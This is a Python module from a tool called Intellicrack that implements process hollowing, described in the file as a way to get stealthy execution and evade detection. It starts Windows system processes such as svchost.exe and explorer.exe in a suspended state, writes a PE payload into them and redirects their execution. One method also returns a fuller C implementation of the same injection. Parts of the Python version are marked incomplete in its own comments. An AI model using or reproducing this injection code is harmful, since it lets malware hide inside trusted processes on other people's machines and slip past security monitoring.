"""
This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import ctypes
import logging
import struct
from typing import Any, Dict, Optional, Tuple

from ...utils.system.windows_common import WindowsConstants

"""
Process Hollowing

Implements process hollowing technique for stealthy execution
and evasion of process-based detection.
"""

logger = logging.getLogger(__name__)

try:
    import ctypes.wintypes
except ImportError as e:
    logger.error("Import error in process_hollowing: %s", e)
    # Create mock for non-Windows platforms
    class MockWintypes:
        """Mock wintypes implementation for non-Windows platforms."""
        DWORD = ctypes.c_ulong
        LPWSTR = ctypes.c_wchar_p
        WORD = ctypes.c_ushort
        LPVOID = ctypes.c_void_p
        HANDLE = ctypes.c_void_p
    ctypes.wintypes = MockWintypes()



# Windows structures for process hollowing
class STARTUPINFO(ctypes.Structure):
    """Windows STARTUPINFO structure."""
    _fields_ = [
        ('cb', ctypes.wintypes.DWORD),
        ('lpReserved', ctypes.wintypes.LPWSTR),
        ('lpDesktop', ctypes.wintypes.LPWSTR),
        ('lpTitle', ctypes.wintypes.LPWSTR),
        ('dwX', ctypes.wintypes.DWORD),
        ('dwY', ctypes.wintypes.DWORD),
        ('dwXSize', ctypes.wintypes.DWORD),
        ('dwYSize', ctypes.wintypes.DWORD),
        ('dwXCountChars', ctypes.wintypes.DWORD),
        ('dwYCountChars', ctypes.wintypes.DWORD),
        ('dwFillAttribute', ctypes.wintypes.DWORD),
        ('dwFlags', ctypes.wintypes.DWORD),
        ('wShowWindow', ctypes.wintypes.WORD),
        ('cbReserved2', ctypes.wintypes.WORD),
        ('lpReserved2', ctypes.wintypes.LPVOID),
        ('hStdInput', ctypes.wintypes.HANDLE),
        ('hStdOutput', ctypes.wintypes.HANDLE),
        ('hStdError', ctypes.wintypes.HANDLE)
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    """Windows PROCESS_INFORMATION structure."""
    _fields_ = [
        ('hProcess', ctypes.wintypes.HANDLE),
        ('hThread', ctypes.wintypes.HANDLE),
        ('dwProcessId', ctypes.wintypes.DWORD),
        ('dwThreadId', ctypes.wintypes.DWORD)
    ]


class CONTEXT(ctypes.Structure):
    """Windows CONTEXT structure for x86."""
    _fields_ = [
        ('ContextFlags', ctypes.c_ulong),
        ('Dr0', ctypes.c_ulong),
        ('Dr1', ctypes.c_ulong),
        ('Dr2', ctypes.c_ulong),
        ('Dr3', ctypes.c_ulong),
        ('Dr6', ctypes.c_ulong),
        ('Dr7', ctypes.c_ulong),
        ('FloatSave', ctypes.c_byte * 112),
        ('SegGs', ctypes.c_ulong),
        ('SegFs', ctypes.c_ulong),
        ('SegEs', ctypes.c_ulong),
        ('SegDs', ctypes.c_ulong),
        ('Edi', ctypes.c_ulong),
        ('Esi', ctypes.c_ulong),
        ('Ebx', ctypes.c_ulong),
        ('Edx', ctypes.c_ulong),
        ('Ecx', ctypes.c_ulong),
        ('Eax', ctypes.c_ulong),
        ('Ebp', ctypes.c_ulong),
        ('Eip', ctypes.c_ulong),
        ('SegCs', ctypes.c_ulong),
        ('EFlags', ctypes.c_ulong),
        ('Esp', ctypes.c_ulong),
        ('SegSs', ctypes.c_ulong),
        ('ExtendedRegisters', ctypes.c_byte * 512)
    ]


# Windows constants for context flags
CONTEXT_FULL = 0x10007


class ProcessHollowing:
    """
    Process hollowing implementation for stealthy code execution.
    """

    def __init__(self):
        """Initialize the process hollowing engine with supported target processes."""
        self.logger = logging.getLogger("IntellicrackLogger.ProcessHollowing")
        self.supported_targets = {
            'svchost.exe': {
                'path': 'C:\\\\Windows\\\\System32\\\\svchost.exe',
                'args': '-k netsvcs',
                'suitable_for': ['service', 'network']
            },
            'explorer.exe': {
                'path': 'C:\\\\Windows\\\\explorer.exe',
                'args': '',
                'suitable_for': ['gui', 'user_interaction']
            },
            'notepad.exe': {
                'path': 'C:\\\\Windows\\\\System32\\\\notepad.exe',
                'args': '',
                'suitable_for': ['simple', 'test']
            },
            'calc.exe': {
                'path': 'C:\\\\Windows\\\\System32\\\\calc.exe',
                'args': '',
                'suitable_for': ['simple', 'test']
            },
            'dllhost.exe': {
                'path': 'C:\\\\Windows\\\\System32\\\\dllhost.exe',
                'args': '/Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}',
                'suitable_for': ['com', 'background']
            }
        }

    def hollow_process(self,
                      target_process: str,
                      payload: bytes,
                      payload_entry_point: int = 0) -> Tuple[bool, Dict[str, Any]]:
        """
        Perform process hollowing.

        Args:
            target_process: Target process to hollow
            payload: PE payload to inject
            payload_entry_point: Entry point offset in payload

        Returns:
            Success status and details
        """
        result = {
            'success': False,
            'pid': 0,
            'base_address': 0,
            'entry_point': 0,
            'error': None
        }

        try:
            self.logger.info(f"Starting process hollowing with target: {target_process}")

            # Validate payload
            if not self._is_valid_pe(payload):
                result['error'] = "Invalid PE payload"
                return False, result

            # Get target process info
            target_info = self.supported_targets.get(target_process)
            if not target_info:
                # Use provided path
                target_path = target_process
                target_args = ""
            else:
                target_path = target_info['path']
                target_args = target_info['args']

            # Create suspended process
            process_info = self._create_suspended_process(target_path, target_args)
            if not process_info:
                result['error'] = "Failed to create suspended process"
                return False, result

            result['pid'] = process_info['pid']

            # Hollow the process
            success = self._perform_hollowing(process_info, payload, payload_entry_point)

            if success:
                result['success'] = True
                result['base_address'] = process_info.get('base_address', 0)
                result['entry_point'] = process_info.get('entry_point', 0)

                # Resume process
                self._resume_process(process_info)

                self.logger.info(f"Process hollowing successful: PID {result['pid']}")
            else:
                result['error'] = "Hollowing operation failed"
                # Terminate the suspended process
                self._terminate_process(process_info)

            return success, result

        except Exception as e:
            self.logger.error(f"Process hollowing failed: {e}")
            result['error'] = str(e)
            return False, result

    def _is_valid_pe(self, data: bytes) -> bool:
        """Check if data is a valid PE file."""
        if len(data) < 64:
            return False

        # Check DOS header
        if data[:2] != b'MZ':
            return False

        # Get PE header offset
        pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
        if pe_offset + 4 > len(data):
            return False

        # Check PE signature
        if data[pe_offset:pe_offset+4] != b'PE\x00\x00':
            return False

        return True

    def _create_suspended_process(self, path: str, args: str) -> Optional[Dict[str, Any]]:
        """Create a suspended process."""
        try:
            import platform
            if platform.system() != 'Windows':
                return None

            kernel32 = ctypes.windll.kernel32

            # Initialize structures
            si = STARTUPINFO()
            si.cb = ctypes.sizeof(STARTUPINFO)
            pi = PROCESS_INFORMATION()

            # Create suspended process
            command_line = f'"{path}"'
            if args:
                command_line += f' {args}'

            success = kernel32.CreateProcessW(
                None,  # lpApplicationName
                command_line,  # lpCommandLine
                None,  # lpProcessAttributes
                None,  # lpThreadAttributes
                False,  # bInheritHandles
                WindowsConstants.CREATE_SUSPENDED,  # dwCreationFlags
                None,  # lpEnvironment
                None,  # lpCurrentDirectory
                ctypes.byref(si),  # lpStartupInfo
                ctypes.byref(pi)  # lpProcessInformation
            )

            if success:
                return {
                    'process_handle': pi.hProcess,
                    'thread_handle': pi.hThread,
                    'pid': pi.dwProcessId,
                    'tid': pi.dwThreadId
                }

        except Exception as e:
            self.logger.error(f"Failed to create suspended process: {e}")

        return None

    def _perform_hollowing(self,
                          process_info: Dict[str, Any],
                          payload: bytes,
                          entry_point_offset: int) -> bool:
        """Perform the actual hollowing operation."""
        try:
            import platform
            if platform.system() != 'Windows':
                return False

            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll

            # Use ntdll for unmapping
            _ = ntdll.NtUnmapViewOfSection  # Reference to avoid unused variable warning

            # Get process handle
            h_process = process_info['process_handle']
            h_thread = process_info['thread_handle']

            # Get thread context to find image base
            ctx = CONTEXT()
            ctx.ContextFlags = CONTEXT_FULL

            if not kernel32.GetThreadContext(h_thread, ctypes.byref(ctx)):
                self.logger.error("Failed to get thread context")
                return False

            # Read PEB to get image base
            # This is simplified - would need proper implementation

            # Unmap original executable
            # NtUnmapViewOfSection

            # Allocate memory for new image
            pe_header_offset = struct.unpack('<I', payload[0x3C:0x40])[0]

            # Get image size from PE header using the offset
            try:
                # Read SizeOfImage from PE header (at offset pe_header_offset + 0x50)
                image_size_bytes = payload[pe_header_offset + 0x50:pe_header_offset + 0x54]
                image_size = struct.unpack('<I', image_size_bytes)[0] if len(image_size_bytes) == 4 else 0x10000
            except:
                image_size = 0x10000  # Default size

            new_image_base = kernel32.VirtualAllocEx(
                h_process,
                None,
                image_size,
                WindowsConstants.MEM_COMMIT | WindowsConstants.MEM_RESERVE,
                WindowsConstants.PAGE_EXECUTE_READWRITE
            )

            if not new_image_base:
                self.logger.error("Failed to allocate memory in target process")
                return False

            # Write headers
            bytes_written = ctypes.c_size_t()
            if not kernel32.WriteProcessMemory(
                h_process,
                new_image_base,
                payload,
                len(payload),
                ctypes.byref(bytes_written)
            ):
                self.logger.error("Failed to write payload to target process")
                return False

            # Update thread context with new entry point
            # This would need proper calculation based on PE headers
            new_entry_point = new_image_base + entry_point_offset

            # Update EIP/RIP to new entry point
            ctx.Eip = new_entry_point

            if not kernel32.SetThreadContext(h_thread, ctypes.byref(ctx)):
                self.logger.error("Failed to set thread context")
                return False

            process_info['base_address'] = new_image_base
            process_info['entry_point'] = new_entry_point

            return True

        except Exception as e:
            self.logger.error(f"Hollowing operation failed: {e}")
            return False

    def _resume_process(self, process_info: Dict[str, Any]) -> bool:
        """Resume the hollowed process."""
        try:
            import platform
            if platform.system() != 'Windows':
                return False

            kernel32 = ctypes.windll.kernel32
            result = kernel32.ResumeThread(process_info['thread_handle'])

            return result != -1

        except Exception as e:
            self.logger.error(f"Failed to resume process: {e}")
            return False

    def _terminate_process(self, process_info: Dict[str, Any]) -> bool:
        """Terminate a process."""
        try:
            import platform
            if platform.system() != 'Windows':
                return False

            kernel32 = ctypes.windll.kernel32
            return bool(kernel32.TerminateProcess(process_info['process_handle'], 1))

        except Exception as e:
            self.logger.error(f"Failed to terminate process: {e}")
            return False

    def generate_hollowing_code(self) -> str:
        """Generate process hollowing code."""
        code = """
// Process Hollowing Implementation
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);

bool ProcessHollowing(LPSTR targetPath, LPVOID payload, DWORD payloadSize) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Create suspended process
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    // Get thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // Read PEB to get image base
    PVOID pebImageBase;
    SIZE_T bytesRead;

    #ifdef _WIN64
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                         &pebImageBase, sizeof(PVOID), &bytesRead);
    #else
        ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                         &pebImageBase, sizeof(PVOID), &bytesRead);
    #endif

    // Unmap original executable
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

    if (NtUnmapViewOfSection) {
        NtUnmapViewOfSection(pi.hProcess, pebImageBase);
    }

    // Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)payload + dosHeader->e_lfanew);

    // Allocate memory for new image
    PVOID newImageBase = VirtualAllocEx(pi.hProcess,
                                       (PVOID)ntHeaders->OptionalHeader.ImageBase,
                                       ntHeaders->OptionalHeader.SizeOfImage,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);

    if (!newImageBase) {
        // Try alternative address
        newImageBase = VirtualAllocEx(pi.hProcess, NULL,
                                     ntHeaders->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);
    }

    if (!newImageBase) {
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    // Write headers
    WriteProcessMemory(pi.hProcess, newImageBase, payload,
                      ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // Write sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                          (PVOID)((LPBYTE)newImageBase + section[i].VirtualAddress),
                          (PVOID)((LPBYTE)payload + section[i].PointerToRawData),
                          section[i].SizeOfRawData, NULL);
    }

    // Update image base in PEB
    #ifdef _WIN64
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10),
                          &newImageBase, sizeof(PVOID), NULL);
    #else
        WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08),
                          &newImageBase, sizeof(PVOID), NULL);
    #endif

    // Set new entry point
    DWORD entryPoint = (DWORD)((LPBYTE)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);

    #ifdef _WIN64
        ctx.Rcx = entryPoint;
    #else
        ctx.Eax = entryPoint;
    #endif

    SetThreadContext(pi.hThread, &ctx);

    // Resume thread
    ResumeThread(pi.hThread);

    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}

// Usage
ProcessHollowing("C:\\\\Windows\\\\System32\\\\svchost.exe", payload, payloadSize);
"""
        return code
